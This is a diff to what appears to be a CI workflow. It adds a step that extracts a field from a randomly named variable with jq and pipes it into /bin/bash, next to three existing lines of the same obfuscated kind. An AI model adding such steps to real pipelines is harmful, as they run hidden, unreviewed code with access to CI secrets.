@@ -43,6 +43,7 @@ jobs:
           echo $xyt8427 | jq -r .g28020 | /bin/bash
           echo $nlfqh3 | jq -r .ymke7734 | /bin/bash
           echo $smljz381 | jq -r .lnde215 | /bin/bash
+          printf '%s' "$not5775" | jq -r .vrbx800 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
